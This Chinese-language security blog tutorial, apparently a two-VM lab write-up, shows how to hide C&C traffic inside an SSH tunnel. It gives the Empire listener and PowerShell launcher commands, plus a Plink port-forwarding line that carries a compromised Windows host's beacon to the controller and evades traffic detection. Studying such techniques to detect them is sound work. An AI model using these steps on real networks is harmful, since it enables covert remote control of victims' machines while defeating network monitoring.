***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

## 一、背景简介

**在网络攻防博弈中，网络流量特征分析类安全防御措施得到了广泛应用。众多厂商和企业对网络流量进行恶意流量分析检测，从而针对性的采取防御措施，如各级ISP在骨干网络设备上大多采用网络流量分析检测的防御方案。**

本文想通过标准的SSH的端口转发建立SSH形式的加密隧道，用于加密、隐蔽传输恶意流量，从而避免通过流量检测发现恶意行为。复现实验部分以C&C通信流量为例进入实验。通过SSH隧道进行加密和隐藏的C&C流量在外部流量特征分析仅表现为标准SSH流量。

![image.png](https://image.3001.net/images/20190708/1562572943_5d22f88fd5c19.png!small)

## 二、实验原理

本次实验使用Empire工具快速搭建C&C信道，本文只简要介绍对于Empire工具。在Windows平台下使用Plink.exe工具的SSH功能搭建SSH隧道。

### 2.1 SSH隧道介绍

SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是， SSH 还能够将其他 TCP 端口的网络数 据通过 SSH
链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（ tunneling），这是因 为 SSH 为其他 TCP
链接提供了一个安全的通道来进行传输而得名。SSH隧道的实现主要使用SSH的参数配置进行端 口转发，即将所需传输的数据内容通过加密的SSH隧道进行转发。
SSH 端口转发能够提供两大功能：1、加密 SSH Client 端至 SSH Server 端之间的通讯数据。2、突破防火墙的限制完成一些之前无法建立的
TCP 连接。

由于SSH的安全性，在数据跨越公网时其他人无法得知数据内容。SSH端口转发有本地转发、远程转发和动态端
口转发三种。本次实验主要以本地转发为例。本地转发主要使用SSH的 -L参数解释：

![image.png](https://image.3001.net/images/20190708/1562574299_5d22fddbbb0f0.png!small)(1)
第1部分，-L选项表示使用“本地转发”建立ssh隧道。“本地转发”表示本地的某个端口上的通讯数据会被转发到目标主机的对应端口。

(2) 第2部分表示：通讯数据会从本地的9906端口上被转发，最终被转发到10.1.0.2的3306端口。

(3) 第3部分表示：我们创建的ssh隧道是连接到10.1.0.2上的root用户。

### 2.2 Empire工具简介

Empire是一个针对windows平台、提供从Stager生成到提取和渗透维持一系列功能齐全的渗透攻击框架，其最
大的特点是以PowerShell脚本作为攻击载荷，而且Empire实现了无需powershell.exe就可运行PowerShell代理功
能，即它是一个纯粹的PowerShell后期漏洞利用代理工具。快速部署后期漏洞利用模块，内置模块有键盘记录、
Mimikatz、绕过UAC、内网扫描等等，并且能够适应通信躲避网络检测和大部分安全防护工具的查杀，简单来说
Empire类似于渗透神器Metasploit，是一个基于PowerShell的远程控制木马。

### 2.2 Empire工具安装

在实验虚拟linux系统中安装

    
    
    git clone https://github.com/EmpireProject/Empire.git #进入setup目录进行命令行安装 
    cd Empire 
    cd setup 
    sudo ./install.sh

安装成功后，确认Empire目录下所有文件(目录)如下图：

![image.png](https://image.3001.net/images/20190708/1562573654_5d22fb566dd01.png!small)使用
./empire 启动Empire如下图，则成功安装。

![image.png](https://image.3001.net/images/20190708/1562573721_5d22fb99ca5bd.png!small)

## 三、实验步骤

实验说明：使用两台虚拟机ubuntu16 + windows 7，其中ubuntu16模拟控制端，windows 7模拟受控主机。

### 3.1 在ubuntu系统上搭建SSH服务端

(1) 安装Open-SSH Server端

    
    
    sudo apt-get install openssh-server

(2) 配置SSH Server端

编辑/etc/ssh/sshd_config文件中允许口令登录PermitRootLogin配置如下图：

![image.png](https://image.3001.net/images/20190708/1562574890_5d23002ae5eef.png!small)

(3) 测试SSH登录是否成功

查看本机IP（linux命令：ifconfig）,如在windows下的XShell工具下输入Server IP 输入登录名和密码，成功登入系统则SSH
Server端搭建成功。

![image.png](https://image.3001.net/images/20190708/1562574975_5d23007f622da.png!small)注：需要重启sshd服务：/etc/init.d/ssh
resar

(4) 配置RSA密钥对认证登录

a) 生成rsa密钥对

    
    
    ssh-keygen -t rsa

b) 开启sshd支持RSA认证选项，并添加认证公钥路径地址

c) 编辑/etc/ssh/sshd_config文件中的PubkeyAuthentication选项配置为yes，即：

![image.png](https://image.3001.net/images/20190708/1562575211_5d23016b3ec04.png!small)d)
复制公钥到某用户home目录下的.ssh文件夹下，注必须使用以下命令在受控主机(本次实验使用win 7进行模拟)进行复制，否则文件权限设置易出错。

    
    
    ssh-copy-id -i id_rsa.pub 主机登录用户名@192.168.81.137

e) 使用私钥进行登录ssh登录

    
    
    ssh -i 私钥路径 主机登录用户名@192.168.81.137

注：使用putty、winscp等工具时需要先使用对应平台工具进行rsa私钥导入后转化为相对应文件格式，如本次实验使用putty工具导入生成私钥文件sshrsa.ppk。

### 3.2 使用Empire工具生成PowerShell脚本备用

Empire工具类似Metasploit，详细使用教程可参考[一篇文章精通PowerShell Empire]()。

本次实验使用Empire生成简单的PowerShell脚本，建立最简单的C&C通信。下面简单概括主要步骤。

(1) 设置监听

    
    
    listeners #进入的界面下可输入list查看以设置的监听
    uselistener http #输入 info查看必填参数
    set Name 4444 #本次实验通过SSH隧道通信，因此设置监听127.0.0.1:4444
    set Port 4444
    set Host 127.0.0.1
    execute #创建命为4444的监听，监听127.0.0.1:4444上通信数据

示例如下：

![image.png](https://image.3001.net/images/20190708/1562576520_5d23068820450.png!small)(2)
生成简单的PowerShell利用脚本(针对windows)

    
    
    launcher powershell 4444 # 4444为设置的监听名字
    #可进入tagers生成其他木马、远控程序，本次实验直接生成最简单PowerShell利用脚本

注：生成的Powershell代码直接复制并保存，以备在受控windows主机(win7、win10)执行。

### 3.3 搭建SSH隧道

(1) windows下使用Plink.exe(putty工具集中可以在windows系统下使用命令行进行SSH连接)连接SSH

Server

    
    
    #需要首先进入Plink.exe文件所在路径
    Plink.exe -ssh -l 登录用户名 -pw 登录密码 SSH主机IP

(2) Plink相关参数

-ssh 指定使用特定连接协议 

-l 指定登录用户名

-i 指定RSA私钥登录

-L 本地转发

(3) Plink端口转发设计

    
    
    plink.exe -ssh -i sshrsa.ppk am00n@192.168.81.137 -L 4444:192.168.81.137:4444

将本地端口（4444）转发到远程目标主机（192.168.81.137）的目标端口(4444）。

注意：以上命令执行成功后，需要保持命令行不要关闭。同时可以组合使用SSH的其他参数进行后台运行、不交互等。

(4) 使用(2)中生成的PowerShell脚本，使受控主机上线

a) windows 7虚拟机另外开启一个CMD窗口，复制PowerShell脚本执行。可以看到受控主机以上线。

![image.png](https://image.3001.net/images/20190708/1562577951_5d230c1f6bb0e.png!small)5)
ubuntu端切换到agents界面，list命令查看如图：

![image.png](https://image.3001.net/images/20190708/1562578011_5d230c5b8633c.png!small)6)
通过interact命令则可以使用以建立的控制信道控制受控主机，如通过简单的ls命令测试成功如下图：

![image.png](https://image.3001.net/images/20190708/1562578070_5d230c9668a5d.png!small)7)
至此以成功使用SSH隧道传输C&C通信流量，后续可在此基础上设计实现其他C&C控制命令及其它恶意功能。

## 四、总结

通过本次实验可以看出，攻击者可以利用类似SSH的公共服务或可用技术辅助攻击，且其实现也非常容易。

 **关键步骤总结** ：

(1) 搭建SSH服务，并配置为RSA私钥登录(也可以配置为免密登录)。

(2) 使用工具(如Empire、Metasploit等)构建C&C。

(3) 利用SSH的端口转发搭建SSH隧道。

(4) 配置C&C和SSH参数使二者配合实现加密、隐藏恶意流量的目的。

 **本文思想源于FreeBuf大神"興趣使然的小胃"，特此感谢。**

 ***本文作者：mumufeng06，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

